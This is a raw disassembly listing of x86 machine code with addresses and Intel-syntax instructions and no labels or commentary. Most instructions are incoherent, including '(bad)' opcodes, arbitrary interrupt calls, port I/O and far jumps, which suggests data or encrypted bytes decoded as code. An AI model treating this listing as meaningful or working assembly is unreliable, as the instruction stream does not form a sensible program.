  426a67:	add    BYTE PTR [eax],al
  426a69:	pop    ebp
  426a6a:	adc    BYTE PTR ds:0xab88080,dh
  426a70:	push   es
  426a71:	bound  eax,QWORD PTR [eax]
  426a73:	add    BYTE PTR [eax],al
  426a75:	int    0xd2
  426a77:	mov    eax,0x94060a
  426a7c:	add    BYTE PTR [eax],al
  426a7e:	int    0xd3
  426a80:	mov    eax,0x98060a
  426a85:	add    BYTE PTR [eax],al
  426a87:	add    al,0x6d
  426a89:	sub    ch,cl
  426a8b:	jge    0x426a45
  426a8d:	or     cl,bh
  426a8f:	mov    eax,0xcf000000
  426a94:	mov    ch,BYTE PTR [eax]
  426a96:	mov    eax,0xbccf0a
  426a9b:	add    BYTE PTR [eax],al
  426a9d:	add    al,0xd3
  426a9f:	pusha  
  426aa0:	mov    eax,0xc0cf0a
  426aa5:	add    BYTE PTR [eax],al
  426aa7:	iret   
  426aa8:	mov    cl,BYTE PTR [edx-0x48]
  426aab:	or     cl,bh
  426aad:	les    eax,FWORD PTR [eax]
  426aaf:	add    BYTE PTR [eax],al
  426ab1:	int    0xf9
  426ab3:	mov    eax,0x9c670a
  426ab8:	add    BYTE PTR [eax],al
  426aba:	iret   
  426abb:	loopne 0x426a5d
  426abd:	pop    edi
  426abe:	add    BYTE PTR ds:0xab88080,dh
  426ac4:	iret   
  426ac5:	enter  0x0,0x0
  426ac9:	iret   
  426aca:	mov    bh,bh
  426acc:	mov    eax,0x90cf0a
  426ad1:	add    BYTE PTR [eax],al
  426ad3:	mov    eax,0xa0670a
  426ad8:	add    BYTE PTR [eax],al
  426ada:	add    al,0xc9
  426adc:	stc    
  426add:	mov    eax,0xa4670a
  426ae2:	add    BYTE PTR [eax],al
  426ae4:	int    0xf9
  426ae6:	pop    edi
  426ae7:	leave  
  426ae8:	xor    eax,0xab88080
  426aed:	iret   
  426aee:	add    BYTE PTR [eax],0x0
  426af1:	add    ch,cl
  426af3:	jge    0x426aad
  426af5:	or     cl,bh
  426af7:	aam    0x0
  426af9:	add    BYTE PTR [eax],al
  426afb:	int    0xc5
  426afd:	mov    eax,0xe0060a
  426b02:	add    BYTE PTR [eax],al
  426b04:	cmp    ebp,DWORD PTR [ebp-0x48]
  426b07:	or     ah,BYTE PTR [edi-0x58]
  426b0a:	add    BYTE PTR [eax],al
  426b0c:	add    bh,cl
  426b0e:	addr16 in al,0x0
  426b11:	add    BYTE PTR [eax],al
  426b13:	leave  
  426b14:	push   es
  426b15:	lods   al,BYTE PTR ds:[esi]
  426b16:	add    BYTE PTR [eax],al
  426b18:	add    dh,ah
  426b1a:	xor    eax,0x6c9352b
  426b1f:	fadd   DWORD PTR [eax]
  426b21:	add    BYTE PTR [eax],al
  426b23:	jae    0x426b5a
  426b25:	jno    0x426b5c
  426b27:	mov    eax,0x3076cdaf
  426b2c:	int    0x8d
  426b2e:	xor    ch,cl
  426b30:	xchg   esi,eax
  426b31:	xor    BYTE PTR [edx+eax*1],al
  426b34:	call   ebx
  426b36:	repnz sub BYTE PTR [ebx],bh
  426b39:	jns    0x426b0e
  426b3b:	mov    ebp,0xcdd35392
  426b40:	lea    esi,[eax]
  426b42:	add    al,0x2
  426b44:	(bad)  
  426b45:	cmp    ebx,DWORD PTR [ecx-0x2cd70d2d]
  426b4b:	repz xchg edx,eax
  426b4d:	push   ebx
  426b4e:	jecxz  0x426b8b
  426b50:	retf   
  426b51:	add    al,0xd2
  426b53:	sbb    bl,BYTE PTR [ebx]
  426b55:	retf   
  426b56:	cmp    eax,DWORD PTR [eax]
  426b58:	inc    ebx
  426b59:	cli    
  426b5a:	das    
  426b5b:	or     cl,dl
  426b5d:	add    BYTE PTR [eax+0x43888280],0xd2
  426b64:	das    
  426b65:	add    al,0x37
  426b67:	add    BYTE PTR [eax+0x308dcd80],0xcd
  426b6e:	xchg   esi,eax
  426b6f:	xor    BYTE PTR [ebx],bh
  426b71:	psrlq  mm5,mm3
  426b74:	xchg   edx,eax
  426b75:	add    al,0xfb
  426b77:	call   ebx
  426b79:	jmp    0xcd7d:0x87135328
  426b80:	aad    0xb8
  426b82:	cmp    edx,DWORD PTR ds:0x708d
  426b88:	add    ch,cl
  426b8a:	lea    esi,[eax]
  426b8c:	int    0xe6
  426b8e:	xor    BYTE PTR [ebx],bh
  426b90:	psrlq  mm5,mm3
  426b93:	xchg   edx,eax
  426b94:	add    al,0xf8
  426b96:	call   ebx
  426b98:	jmp    0x8832bec5
  426b9d:	jge    0x426b57
  426b9f:	int    0xcc
  426ba1:	lea    esi,[eax+0x0]
  426ba4:	add    BYTE PTR [eax],al
  426ba6:	mov    eax,0xd3b8e3f8
  426bab:	repnz das 
  426bad:	mov    eax,0x53b8f3e3
  426bb2:	jecxz  0x426b81
  426bb4:	lea    esi,[eax]
  426bb6:	int    0xe6
  426bb8:	xor    BYTE PTR [ebx],bh
  426bba:	psrlq  mm5,mm3
  426bbd:	xchg   edx,eax
  426bbe:	add    al,0xf8
  426bc0:	call   ebx
  426bc2:	jmp    0x8832beef
  426bc7:	jge    0x426b81
  426bc9:	or     dl,BYTE PTR ds:0x708d
  426bcf:	add    ch,cl
  426bd1:	lea    esi,[eax]
  426bd3:	int    0x96
  426bd5:	xor    BYTE PTR [ebx],bh
  426bd7:	(bad)  
  426bd9:	sti    
  426bda:	call   ebx
  426bdc:	jmp    0x426b70
  426bde:	shr    edx,cl
  426be0:	sub    BYTE PTR [ebx+0x13],dl
  426be3:	int    0x96
  426be5:	xor    BYTE PTR [edi+0x308dcdd3],al
  426beb:	add    al,0x2
  426bed:	(bad)  
  426bee:	cmp    ebx,DWORD PTR [ecx-0x2cd70d2d]
  426bf4:	repz xchg edx,eax
  426bf6:	push   ebx
  426bf7:	jecxz  0x426c34
  426bf9:	retf   
  426bfa:	add    al,0xd2
  426bfc:	sbb    bl,BYTE PTR [ebx]
  426bfe:	retf   
  426bff:	cmp    eax,DWORD PTR [eax]
  426c01:	inc    ebx
  426c02:	cli    
  426c03:	das    
  426c04:	or     ebp,DWORD PTR [esi+0x2f000000]
  426c0a:	pop    es
  426c0b:	pop    ebx
  426c0c:	add    BYTE PTR [eax],al
  426c0e:	add    bl,al
  426c10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426c11:	mov    esi,0x76cf4229
  426c16:	jne    0x426c22
  426c18:	jbe    0x426ba2
  426c1a:	int    0x76
  426c1c:	mov    BYTE PTR [edi+0x13de37b6],bh
  426c22:	or     bl,BYTE PTR [ecx+ecx*8]
  426c25:	ins    BYTE PTR es:[edi],dx
  426c26:	test   BYTE PTR [ebp-0x32dadcf6],bh
  426c2c:	jbe    0x426ca3
  426c2e:	int    0x8d
  426c30:	jge    0x426c61
  426c32:	inc    ebp
  426c33:	jge    0x426bc7
  426c35:	shr    ebx,cl
  426c37:	xchg   edx,eax
  426c38:	int    0x8d
  426c3a:	jne    0x426c09
  426c3c:	xchg   esi,eax
  426c3d:	jge    0x426c7a
  426c3f:	leave  
  426c40:	cmp    ebx,edx
  426c42:	push   ebx
  426c43:	icebp  
  426c44:	int    0x76
  426c46:	cmc    
  426c47:	bound  eax,QWORD PTR [ebp-0x7f7f7edb]
  426c4d:	jo     0x426c1e
  426c4f:	push   es
  426c50:	cmc    
  426c51:	inc    DWORD PTR [eax]
  426c53:	add    BYTE PTR [eax-0x2d],dh
  426c56:	repnz sub BYTE PTR [ebp+0xf2a3],bh
  426c5d:	int    0x76
  426c5f:	in     eax,dx
  426c60:	int    0x8d
  426c62:	adc    DWORD PTR [edi],ebp
  426c64:	inc    ebp
  426c65:	jge    0x426bf9
  426c67:	shr    ebx,cl
  426c69:	xchg   edx,eax
  426c6a:	int    0x8d
  426c6c:	in     eax,dx
  426c6d:	int    0x96
  426c6f:	adc    ebx,edx
  426c71:	repnz sub ch,cl
  426c74:	iret   
  426c75:	cmc    
  426c76:	inc    DWORD PTR [eax]
  426c78:	add    ch,cl
  426c7a:	mov    DWORD PTR [ebx],edi
  426c7c:	leave  
  426c7d:	cmp    ebx,edx
  426c7f:	push   ebx
  426c80:	rol    BYTE PTR [ebx+0x7d],cl
  426c83:	das    
  426c84:	push   es
  426c85:	push   ebp
  426c86:	add    BYTE PTR [eax-0xa293280],0xc9
  426c8d:	jbe    0x426c9c
  426c8f:	(bad)  
  426c90:	ficom  WORD PTR ss:[ebx]
  426c93:	pop    ebp
  426c94:	mov    ebp,0xa25230a
  426c99:	jbe    0x426c8c
  426c9b:	or     ah,BYTE PTR [esi-0x6289f56b]
  426ca1:	int    0x76
  426ca3:	xchg   ebp,eax
  426ca4:	int    0x8d
  426ca6:	popf   
  426ca7:	das    
  426ca8:	inc    ebp
  426ca9:	jge    0x426c3d
  426cab:	shr    ebx,cl
  426cad:	xchg   edx,eax
  426cae:	int    0x8d
  426cb0:	xchg   ebp,eax
  426cb1:	int    0x96
  426cb3:	popf   
  426cb4:	cmp    ecx,ecx
  426cb6:	cmp    ebx,edx
  426cb8:	push   ebx
  426cb9:	icebp  
  426cba:	bound  eax,QWORD PTR [eax]
  426cbc:	(bad)  
  426cbd:	xor    al,0xd3
  426cbf:	repnz sub BYTE PTR [eax],al
  426cc2:	pop    ecx
  426cc3:	xor    eax,0xbd808081
  426cc8:	push   eax
  426cc9:	repnz add BYTE PTR [eax],al
  426ccc:	int    0x76
  426cce:	xchg   ebp,eax
  426ccf:	int    0x8d
  426cd1:	popf   
  426cd2:	das    
  426cd3:	inc    ebp
  426cd4:	jge    0x426c68
  426cd6:	shr    ebx,cl
  426cd8:	xchg   edx,eax
  426cd9:	int    0x8d
  426cdb:	xchg   ebp,eax
  426cdc:	int    0x96
  426cde:	popf   
  426cdf:	cmp    ecx,ecx
  426ce1:	cmp    ebx,edx
  426ce3:	push   ebx
  426ce4:	icebp  
  426ce5:	bound  eax,QWORD PTR [eax]
  426ce7:	pop    ecx
  426ce8:	xor    eax,0xd3808081
  426ced:	repnz sub BYTE PTR [eax],al
  426cf0:	pop    ecx
  426cf1:	sub    eax,0xbd808081
  426cf6:	xchg   edx,eax
  426cf7:	repnz add BYTE PTR [eax],al
  426cfa:	int    0x7
  426cfc:	xor    eax,0xcd808081
  426d01:	mov    ch,cl
  426d03:	jle    0x426d69
  426d05:	xchg   DWORD PTR [eax-0x327772f6],ecx
  426d0b:	lea    ecx,ds:0x2ff176cd
  426d11:	inc    ebp
  426d12:	rcl    DWORD PTR [edx-0x326d422d],cl
  426d18:	jbe    0x426d27
  426d1a:	int    0x96
  426d1c:	icebp  
  426d1d:	cmp    esi,eax
  426d1f:	shr    DWORD PTR [ebp+0x536d3b28],cl
  426d25:	ror    ebp,cl
  426d27:	lea    ecx,[eax+0x187ebb2f]
  426d2d:	push   es
  426d2e:	jge    0x426d04
  426d30:	dec    esp
  426d31:	int    0x7
  426d33:	popf   
  426d34:	add    DWORD PTR [eax+0x4180c980],0xcd358621
  426d3e:	jbe    0x426d8c
  426d40:	int    0x76
  426d42:	xor    BYTE PTR [eax],al
  426d44:	(bad)  
  426d45:	cmp    al,0x0
  426d47:	(bad)  
  426d48:	cmc    
  426d49:	add    dh,dl
  426d4b:	sub    al,0x0
  426d4d:	(bad)  
  426d4e:	and    al,0x0
  426d50:	(bad)  
  426d51:	sbb    al,0x0
  426d53:	(bad)  
  426d54:	adc    al,0xbd
  426d56:	test   ch,dh
  426d58:	add    BYTE PTR [eax],al
  426d5a:	or     al,BYTE PTR [esi]
  426d5c:	adc    edi,edi
  426d5e:	add    BYTE PTR [eax],al
  426d60:	int    0x76
  426d62:	cmp    al,0x4
  426d64:	fcom   QWORD PTR [eax+eax*4]
  426d67:	aam    0x1a
  426d69:	int    0x76
  426d6b:	cmp    al,0x4
  426d6d:	fsub   QWORD PTR [eax+eax*4]
  426d70:	aam    0x4e
  426d72:	int    0x6
  426d74:	adc    edi,edi
  426d76:	add    BYTE PTR [eax],al
  426d78:	int    0x8d
  426d7a:	cmp    al,0xa
  426d7c:	outs   dx,BYTE PTR ds:[esi]
  426d7d:	sbb    al,0xec
  426d7f:	push   ebx
  426d80:	add    dh,dl
  426d82:	cmp    al,0x0
  426d84:	(bad)  
  426d85:	cmc    
  426d86:	mov    ebp,0x6daa
  426d8b:	stos   BYTE PTR es:[edi],al
  426d8c:	test   al,0x63
  426d8e:	retf   
  426d8f:	shl    BYTE PTR [eax+eax*4],cl
  426d92:	xchg   esi,eax
  426d93:	int    0xed
  426d95:	jno    0x426e08
  426d97:	cwde   
  426d98:	leave  
  426d99:	jbe    0x426d98
  426d9b:	dec    ecx
  426d9c:	and    DWORD PTR [esi-0x68936cb],eax
  426da2:	inc    ecx
  426da3:	and    DWORD PTR [esi-0x28932cb],eax
  426da9:	int    0xd6
  426dab:	std    
  426dac:	sar    bh,0x5f
  426daf:	shl    DWORD PTR [ecx],1
  426db1:	xchg   BYTE PTR ds:0x3ba0d33b,dh
  426db7:	sti    
  426db8:	sar    DWORD PTR [ebp+0x28b9d392],cl
  426dbe:	push   ebx
  426dbf:	jns    0x426d8e
  426dc1:	(bad)  
  426dc2:	mov    BYTE PTR [ebx+0x11],al
  426dc5:	int    0x76
  426dc7:	std    
  426dc8:	aam    0xc4
  426dca:	int    0xd6
  426dcc:	std    
  426dcd:	cmp    edx,ebx
  426dcf:	cmp    edi,ebx
  426dd1:	sar    DWORD PTR [ecx-0x6d422cd8],cl
  426dd7:	push   ebx
  426dd8:	jns    0x426da7
  426dda:	(bad)  
  426ddb:	dec    esp
  426ddc:	inc    ebx
  426ddd:	adc    esp,edx
  426ddf:	pop    ebx
  426de0:	int    0x96
  426de2:	xor    BYTE PTR [edx-0x32b31933],bl
  426de8:	jbe    0x426d72
  426dea:	cmp    esi,edi
  426dec:	push   es
  426ded:	add    ah,dl
  426def:	push   esi
  426df0:	pop    ebx
  426df1:	retf   0x8624
  426df4:	or     DWORD PTR [esi-0x59a6d0d1],esp
  426dfa:	das    
  426dfb:	push   es
  426dfc:	fcmovbe st,st(6)
  426dfe:	dec    esi
  426dff:	add    al,0xf4
  426e01:	adc    DWORD PTR [edx],0xffffffc5
  426e04:	fwait
  426e05:	add    BYTE PTR [eax+0x2fa60980],0xec
  426e0c:	dec    esp
  426e0d:	adc    ch,ah
  426e0f:	in     eax,dx
  426e10:	add    BYTE PTR [eax+0x2fa60980],0xf1
  426e17:	lea    ebp,[edi]
  426e19:	retf   0x2fa6
  426e1c:	or     DWORD PTR [esi+eax*4],esp
  426e1f:	js     0x426e64
  426e21:	clc    
  426e22:	or     BYTE PTR [esi],0x63
  426e25:	int    0x76
  426e27:	stc    
  426e28:	cmp    edx,ebx
  426e2a:	int    0x8d
  426e2c:	stc    
  426e2d:	add    al,0x2
  426e2f:	jmp    FWORD PTR [edx+0x76cd4aec]
  426e35:	std    
  426e36:	cmp    edx,ebx
  426e38:	int    0x8d
  426e3a:	std    
  426e3b:	cmp    edx,DWORD PTR [ebx]
  426e3d:	shl    edx,cl
  426e3f:	sub    bl,dl
  426e41:	mov    ebp,0xa8d35392
  426e46:	retf   
  426e47:	ror    BYTE PTR [eax+eax*4-0x6a],cl
  426e4b:	int    0xed
  426e4d:	add    al,0xed
  426e4f:	(bad)  
  426e50:	leave  
  426e51:	jbe    0x426e50
  426e53:	dec    ecx
  426e54:	and    DWORD PTR [esi+0x21416135],eax
  426e5a:	xchg   BYTE PTR ds:0xcdf9960a,dh
  426e60:	jbe    0x426e76
  426e62:	or     dh,BYTE PTR [esi+0x14]
  426e65:	int    0x76
  426e67:	adc    al,0xcd
  426e69:	add    DWORD PTR ds:0xcd808081,ebp
  426e6f:	lea    edx,[ecx*8+0x2d0acd80]
  426e76:	add    DWORD PTR [eax-0x78763280],0xa5b647c
  426e80:	lea    esi,[ebp-0x32028933]
  426e86:	(bad)  
  426e87:	std    
  426e88:	cwde   
  426e89:	call   0x3b85:0x82cfffc0
  426e90:	jns    0x426e65
  426e92:	mov    ebp,0xf03baa92
  426e97:	shl    edx,cl
  426e99:	sub    BYTE PTR [ebx-0x2d],dl
  426e9c:	or     dh,BYTE PTR [esi-0x63]
  426e9f:	int    0x76
  426ea1:	std    
  426ea2:	int    0x8d
  426ea4:	std    
  426ea5:	cmp    edi,DWORD PTR [ecx-0x2d]
  426ea8:	mov    ebp,0xd3f03b92
  426ead:	repnz sub BYTE PTR [ebx-0x2d],dl
  426eb1:	or     dh,BYTE PTR [esi-0x53]
  426eb4:	int    0x76
  426eb6:	mov    ch,0xcd
  426eb8:	ins    BYTE PTR es:[edi],dx
  426eb9:	jo     0x426ebf
  426ebb:	mov    ebp,0xf1760a4c
  426ec0:	int    0x76
  426ec2:	mov    ch,0xcd
  426ec4:	ins    BYTE PTR es:[edi],dx
  426ec5:	pop    esp
  426ec6:	int    0x8d
  426ec8:	mov    ch,0x7c
  426eca:	push   es
  426ecb:	outs   dx,BYTE PTR ds:[esi]
  426ecc:	xchg   esp,eax
  426ecd:	int    0x76
  426ecf:	mov    ch,0xd4
  426ed1:	sbb    al,0xcd
  426ed3:	ins    BYTE PTR es:[edi],dx
  426ed4:	pop    esp
  426ed5:	int    0x8d
  426ed7:	mov    ch,0xcd
  426ed9:	jle    0x426e6f
  426edb:	jl     0x426ed5
  426edd:	icebp  
  426ede:	sub    edi,DWORD PTR [ebp-0x33]
  426ee1:	jbe    0x426e98
  426ee3:	int    0x6c
  426ee5:	pop    esp
  426ee6:	xchg   ebx,edx
  426ee8:	in     al,dx
  426ee9:	xchg   ebp,ecx
  426eeb:	ins    BYTE PTR es:[edi],dx
  426eec:	xchg   esp,eax
  426eed:	or     dh,BYTE PTR [esi-0x43]
  426ef0:	int    0x76
  426ef2:	std    
  426ef3:	int    0x8d
  426ef5:	std    
  426ef6:	cmp    edi,DWORD PTR [ecx+0x3b]
  426ef9:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  426f00:	push   ebx
  426f01:	ror    DWORD PTR [edx],cl
  426f03:	jbe    0x426f19
  426f05:	int    0x76
  426f07:	std    
  426f08:	int    0x8d
  426f0a:	std    
  426f0b:	cmp    edi,DWORD PTR [ecx+0x3b]
  426f0e:	lock shl edx,cl
  426f11:	sub    bl,dl
  426f13:	mov    ebp,0xad35392
  426f18:	jbe    0x426f2e
  426f1a:	int    0x76
  426f1c:	std    
  426f1d:	int    0x8d
  426f1f:	std    
  426f20:	cmp    esi,eax
  426f22:	cmp    edi,DWORD PTR [ecx-0x2d]
  426f25:	repnz sub bl,dl
  426f28:	mov    ebp,0xcdd35392
  426f2d:	lea    esi,[eax]
  426f2f:	or     al,BYTE PTR [ecx-0x36eb69f6]
  426f35:	jbe    0x426f4b
  426f37:	cmp    DWORD PTR [ecx],esp
  426f39:	xchg   BYTE PTR ds:0xb21476c9,dh
  426f3f:	and    DWORD PTR [esi+0x1476c935],eax
  426f45:	imul   esp,DWORD PTR [ecx],0x36eb3586
  426f4b:	xchg   BYTE PTR [eax-0x2893280],al
  426f51:	int    0x8d
  426f53:	std    
  426f54:	cmp    edi,DWORD PTR [ecx+0x3b]
  426f57:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  426f5e:	push   ebx
  426f5f:	ror    DWORD PTR [edx],cl
  426f61:	jbe    0x426f10
  426f63:	int    0x76
  426f65:	mov    ebp,0xa4c7687
  426f6a:	jbe    0x426f09
  426f6c:	add    dh,dl
  426f6e:	popf   
  426f6f:	add    dh,dl
  426f71:	dec    esp
  426f72:	int    0x8d
  426f74:	mov    ch,0xbd
  426f76:	neg    bh
  426f78:	add    BYTE PTR [eax],al
  426f7a:	or     dh,BYTE PTR [esi+0x14]
  426f7d:	int    0x76
  426f7f:	adc    al,0x6
  426f81:	ins    DWORD PTR es:[edi],dx
  426f82:	aam    0x60
  426f84:	int    0x76
  426f86:	popf   
  426f87:	or     dh,BYTE PTR [esi-0x5b]
  426f8a:	int    0x76
  426f8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f8d:	int    0x8d
  426f8f:	dec    esp
  426f90:	xor    edx,ebx
  426f92:	or     dh,BYTE PTR [esi-0x5b]
  426f95:	int    0x76
  426f97:	adc    al,0xcd
  426f99:	lea    edx,[ecx*8+0x6e87306c]
  426fa0:	dec    esp
  426fa1:	int    0x8d
  426fa3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426fa4:	inc    ebx
  426fa5:	jge    0x426f29
  426fa7:	sbb    ch,cl
  426fa9:	jbe    0x426fbf
  426fab:	int    0x6c
  426fad:	dec    esp
  426fae:	int    0x8d
  426fb0:	adc    al,0x87
  426fb2:	outs   dx,BYTE PTR ds:[esi]
  426fb3:	mov    ch,cl
  426fb5:	lea    esp,[ebp-0x2e142ccd]
  426fbb:	test   DWORD PTR [eax+0x2149bf80],eax
  426fc1:	xchg   BYTE PTR ds:0xc90da60a,dh
  426fc7:	jbe    0x427046
  426fc9:	inc    ecx
  426fca:	and    DWORD PTR [esi+0x7576c935],eax
  426fd0:	cmp    DWORD PTR [ecx],esp
  426fd2:	xchg   BYTE PTR ds:0xb26d76c9,dh
  426fd8:	and    DWORD PTR [esi+0xd76cf35],eax
  426fde:	or     dh,BYTE PTR [esi-0xb]
  426fe1:	iret   
  426fe2:	jbe    0x427061
  426fe4:	or     dh,BYTE PTR [esi+0x11]
  426fe7:	iret   
  426fe8:	jbe    0x42705f
  426fea:	or     dh,BYTE PTR [esi+0x14]
  426fed:	iret   
  426fee:	jbe    0x42705d
  426ff0:	or     dh,BYTE PTR [esi-0x13]
  426ff3:	int    0x76
  426ff5:	std    
  426ff6:	int    0x8d
  426ff8:	std    
  426ff9:	cmp    edi,DWORD PTR [ecx+0x3b]
  426ffc:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427003:	push   ebx
  427004:	ror    DWORD PTR [edx],cl
  427006:	jbe    0x426fad
  427008:	jmp    0x42701d
  42700a:	xchg   DWORD PTR [eax-0x4d03ed80],eax
  427010:	and    DWORD PTR [esi-0x22fad0cb],eax
  427016:	xchg   DWORD PTR [eax+0x4cc080],eax
  42701c:	(bad)  
  42701d:	popf   
  42701e:	iret   
  42701f:	jbe    0x426ff1
  427021:	jo     0x426fe0
  427023:	xlat   BYTE PTR ds:[ebx]
  427024:	fild   WORD PTR [eax]
  427026:	add    ch,cl
  427028:	jbe    0x427023
  42702a:	int    0x8d
  42702c:	stc    
  42702d:	cmp    edi,DWORD PTR [ecx+0x3b]
  427030:	lock shl edx,cl
  427033:	sub    bl,dl
  427035:	mov    ebp,0xad35392
  42703a:	jbe    0x426fe9
  42703c:	or     ah,BYTE PTR [esi-0x6a29ae6b]
  427042:	int    0x76
  427044:	xchg   ebp,eax
  427045:	sar    DWORD PTR [ebp-0x2c1ec46e],cl
  42704b:	in     eax,0x28
  42704d:	push   ebx
  42704e:	popf   
  42704f:	or     ah,BYTE PTR [esi-0x689325b]
  427055:	int    0x8d
  427057:	stc    
  427058:	cmp    esi,eax
  42705a:	shl    edx,cl
  42705c:	sub    BYTE PTR [ebx],bh
  42705e:	jns    0x427033
  427060:	mov    ebp,0xcdd35392
  427065:	(bad)  
  427066:	stc    
  427067:	int    0x96
  427069:	stc    
  42706a:	cmp    ecx,DWORD PTR [edi]
  42706c:	cmp    ebx,ecx
  42706e:	shr    ebx,cl
  427070:	xchg   edx,eax
  427071:	shr    edx,cl
  427073:	sub    BYTE PTR [ebx+0x13],dl
  427076:	xchg   ebx,edx
  427078:	int    0x8d
  42707a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42707b:	or     ah,BYTE PTR [esi-0x2982bc9b]
  427081:	sub    ch,cl
  427083:	jbe    0x42707e
  427085:	int    0x8d
  427087:	stc    
  427088:	cmp    edi,DWORD PTR [ecx+0x3b]
  42708b:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427092:	push   ebx
  427093:	shl    DWORD PTR [eax-0x40],cl
  427096:	dec    esp
  427097:	iret   
  427098:	jbe    0x42706a
  42709a:	jo     0x427059
  42709c:	sti    
  42709d:	std    
  42709e:	add    BYTE PTR [eax],al
  4270a0:	int    0x76
  4270a2:	std    
  4270a3:	int    0x8d
  4270a5:	std    
  4270a6:	cmp    edi,DWORD PTR [ecx+0x3b]
  4270a9:	lock shl edx,cl
  4270ac:	sub    bl,dl
  4270ae:	mov    ebp,0xcdd35392
  4270b3:	lea    esp,[ebp+0x28d47d43]
  4270b9:	int    0x76
  4270bb:	std    
  4270bc:	int    0x8d
  4270be:	std    
  4270bf:	cmp    edi,DWORD PTR [ecx+0x3b]
  4270c2:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4270c9:	push   ebx
  4270ca:	shl    DWORD PTR [eax-0x40],cl
  4270cd:	dec    esp
  4270ce:	iret   
  4270cf:	jbe    0x4270a1
  4270d1:	jo     0x427090
  4270d3:	mov    edi,0xcd0000fd
  4270d8:	jbe    0x4270cf
  4270da:	int    0x8d
  4270dc:	cmc    
  4270dd:	int    0x89
  4270df:	int    0x80
  4270e1:	cmp    esi,eax
  4270e3:	cmp    edi,DWORD PTR [ecx-0x2d]
  4270e6:	repnz sub bl,dl
  4270e9:	mov    ebp,0xcad35392
  4270ee:	je     0x427075
  4270f0:	ror    ch,1
  4270f2:	(bad)  
  4270f3:	std    
  4270f4:	int    0x96
  4270f6:	std    
  4270f7:	cmp    ecx,DWORD PTR [edi]
  4270f9:	cmp    ebx,ecx
  4270fb:	shr    ebx,cl
  4270fd:	xchg   edx,eax
  4270fe:	shr    edx,cl
  427100:	sub    BYTE PTR [edi],ch
  427102:	pop    ecx
  427103:	ins    DWORD PTR es:[edi],dx
  427104:	push   ebx
  427105:	adc    eax,DWORD PTR [ebx-0x2d]
  427108:	das    
  427109:	add    eax,0x80809212
  42710e:	int    0x76
  427110:	adc    ebp,ecx
  427112:	lea    edx,[ecx]
  427114:	int    0x89
  427116:	int    0x80
  427118:	cmp    esi,eax
  42711a:	cmp    edi,DWORD PTR [ecx-0x2d]
  42711d:	repnz sub bl,dl
  427120:	mov    ebp,0xcad35392
  427125:	je     0x4270ac
  427127:	ror    ch,1
  427129:	(bad)  
  42712a:	std    
  42712b:	int    0x96
  42712d:	std    
  42712e:	cmp    ecx,DWORD PTR [edi]
  427130:	cmp    ebx,ecx
  427132:	shr    ebx,cl
  427134:	xchg   edx,eax
  427135:	shr    edx,cl
  427137:	sub    BYTE PTR [edi],ch
  427139:	pop    ecx
  42713a:	ins    DWORD PTR es:[edi],dx
  42713b:	push   ebx
  42713c:	adc    eax,DWORD PTR [ebx-0x2d]
  42713f:	das    
  427140:	add    eax,0x8080928a
  427145:	int    0x76
  427147:	adc    al,0xcd
  427149:	lea    edx,[ecx*8+0x3b80cd89]
  427150:	lock cmp edi,DWORD PTR [ecx-0x2d]
  427154:	repnz sub bl,dl
  427157:	mov    ebp,0xcad35392
  42715c:	je     0x4270e3
  42715e:	ror    ch,1
  427160:	(bad)  
  427161:	std    
  427162:	int    0x96
  427164:	std    
  427165:	cmp    ecx,DWORD PTR [edi]
  427167:	cmp    ebx,ecx
  427169:	shr    ebx,cl
  42716b:	xchg   edx,eax
  42716c:	shr    edx,cl
  42716e:	sub    BYTE PTR [edi],ch
  427170:	pop    ecx
  427171:	ins    DWORD PTR es:[edi],dx
  427172:	push   ebx
  427173:	adc    eax,DWORD PTR [ebx-0x2d]
  427176:	das    
  427177:	add    eax,0x8080921b
  42717c:	int    0x76
  42717e:	in     eax,dx
  42717f:	int    0x8d
  427181:	in     eax,dx
  427182:	int    0x89
  427184:	int    0x80
  427186:	cmp    esi,eax
  427188:	cmp    edi,DWORD PTR [ecx-0x2d]
  42718b:	repnz sub bl,dl
  42718e:	mov    ebp,0xcad35392
  427193:	je     0x42711a
  427195:	ror    ch,1
  427197:	(bad)  
  427198:	std    
  427199:	int    0x96
  42719b:	std    
  42719c:	cmp    ecx,DWORD PTR [edi]
  42719e:	cmp    ebx,ecx
  4271a0:	shr    ebx,cl
  4271a2:	xchg   edx,eax
  4271a3:	shr    edx,cl
  4271a5:	sub    BYTE PTR [edi],ch
  4271a7:	pop    ecx
  4271a8:	ins    DWORD PTR es:[edi],dx
  4271a9:	push   ebx
  4271aa:	adc    eax,DWORD PTR [ebx-0x2d]
  4271ad:	das    
  4271ae:	add    eax,0x808081a5
  4271b3:	int    0x76
  4271b5:	adc    ebp,ecx
  4271b7:	lea    edx,[ecx]
  4271b9:	int    0x89
  4271bb:	int    0x80
  4271bd:	cmp    esi,eax
  4271bf:	shl    edx,cl
  4271c1:	sub    BYTE PTR [ebx],bh
  4271c3:	jns    0x427198
  4271c5:	mov    ebp,0xcad35392
  4271ca:	je     0x427151
  4271cc:	ror    ch,1
  4271ce:	(bad)  
  4271cf:	cmc    
  4271d0:	int    0x89
  4271d2:	int    0x96
  4271d4:	cmc    
  4271d5:	int    0x22
  4271d7:	cmp    ecx,DWORD PTR [edi]
  4271d9:	shr    ebx,cl
  4271db:	xchg   edx,eax
  4271dc:	cmp    ebx,ecx
  4271de:	shr    edx,cl
  4271e0:	sub    BYTE PTR [ebx+0x13],dl
  4271e3:	retf   0x4d8c
  4271e6:	rol    BYTE PTR [edx-0x2d],1
  4271e9:	int    0x8d
  4271eb:	adc    al,0xcd
  4271ed:	mov    ebp,ecx
  4271ef:	xchg   esi,eax
  4271f0:	adc    al,0xcd
  4271f2:	and    bh,BYTE PTR [ebx]
  4271f4:	psrlq  mm5,mm3
  4271f7:	xchg   edx,eax
  4271f8:	cmp    ebx,ecx
  4271fa:	shr    edx,cl
  4271fc:	sub    BYTE PTR [ebx+0x13],dl
  4271ff:	retf   0x4d8c
  427202:	ror    BYTE PTR [edx-0x2d],1
  427205:	int    0x8d
  427207:	cmc    
  427208:	int    0x89
  42720a:	int    0x96
  42720c:	cmc    
  42720d:	int    0x22
  42720f:	cmp    ecx,DWORD PTR [edi]
